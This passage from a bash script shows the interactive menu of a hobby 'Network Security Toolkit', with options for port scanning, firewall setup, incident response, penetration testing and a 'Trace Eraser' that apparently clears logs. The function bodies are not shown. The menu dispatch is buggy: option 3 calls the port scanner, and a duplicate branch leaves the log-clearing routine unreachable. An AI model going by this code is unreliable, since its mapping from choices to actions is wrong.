						echo -e " Thanks for using \e[0;31mThe Network Security Toolkit!\e[0m See you next time... "
						echo ""
						exit
					elif [ "$option" == "exit" ]
					then
						echo ""
						echo -e " Thanks for using \e[0;31mThe Network Security Toolkit!\e[0m See you next time... "
						echo ""
						exit
					else
						echo -e "\e[0;31m[!] Enter valid option.\e[0m"
					fi
					done			
			}
			MAIN_WITHOUT_NETWORK()
			{
				#catching keyboard interruption
				keyboard_interruptt()
				{
					echo ""
					echo -e " \n\n\e[0;31m QUITTING!\e[0m\n"
					# echo ""
					exit 2
				}
				trap "keyboard_interruptt" 2
					echo
					echo -e " Select From The Menu:"
					echo ""
					echo -e "  1) Network Troubleshoot   "
					echo -e "  2) Protocol Enumerator    "
					echo -e "  3) Trace Eraser"
					echo "  4) Firewall Configuration"
					echo "  5) Incidence Response (Uncover)"
					echo "  6) Penetration Testing (rapid)"
					echo "  7) Update NST configuration"
					echo "  8) Help/Credits/About the Network-Security Toolkit"
					echo ""
					echo " 99) Exit the Network-Security Toolkit"
					# echo ""
					while true
					do
					under=$(tput smul)
					normal=$(tput sgr0)
					# echo -e "\e[0;36m"
					echo 
					read -p "${under}nst${normal} > " option
					# echo ""

					#Conditional statements 
					if [ "$option" == "1" ]
					then
						echo -e "\e[0;31m[!] Cannot access this module as it is disabled.\e[0m"
					elif [ "$option" == "2" ]
					then
						echo -e "\e[0;31m[!] Cannot access this module as it is disabled.\e[0m"
					elif [ "$option" == "3"  ]
					then
						port_scanner
					elif [ "$option" == "3"  ]
					then
						clear_logs
					elif [ "$option" == "4" ]
					then
						firewall
					elif [ "$option" == "5" ]
					then
						incidence_resp
					elif [ "$option" == "6"  ]
					then
						pentesting_without_network
					elif [ "$option" == "7" ]
					then
						sleep 1
						clear 
						banner 
						details 
						details2
						main
					elif [ "$option" == "8" ]
					then 
						cat $(pwd)/dependencies/README.md
						echo -e "   Press \e[0;31m<enter>\e[0m to continue."
						read -n 1 -s -r 
					elif [ "$option" == "motivate me" ]
					then
						echo
						motivate | cowsay -f tux
					elif [ "$option" == "hugs" ]
					then
						echo -e "\e[0;0m [!] Hey! here's your free HUG \e[0m\n"
						echo -e "Press \e[0;31m<enter>\e[0m if you recieved it..."
						read -n 1 -s -r 
						# echo ""
					elif [ "$option" == "clear" ]
					then
						clear 
						banner 
						details 
						# details2
						# echo 
						main
					elif [ "$option" == "99"  ]
					then

						echo ""
						# echo -e "\e[0;35m Thanks for using The Network Security Toolkit! See you next time...\e[0m "
						echo -e " Thanks for using \e[0;31mThe Network Security Toolkit!\e[0m See you next time... "
						echo ""
						exit
					elif [ "$option" == "exit" ]
					then
						echo ""
						echo -e " Thanks for using \e[0;31mThe Network Security Toolkit!\e[0m See you next time... "
						echo ""
						exit
					else
						echo -e "\e[0;31m[!] Enter valid option.\e[0m"
					fi
					done	
			}	
		
			sleep 1
			#main
			if [ $flag == "0" ]; then
				main
			else 
				MAIN_WITHOUT_NETWORK
			fi
		fi
		else
			echo 
			echo -e "\e[1;0m======================================================================
\e[0;32m[*]\e[0m The Network-Security Toolkit(v1.0.0/2022) 
[*] \e[0;31mUse "-s" to start the framework\e[0m            
======================================================================\e[0m\n" 
		fi	
	else
		echo -e "\e[0;31m[!] You must first agree to the terms and conditions before starting NST."	
	fi
# fi
fi
fi


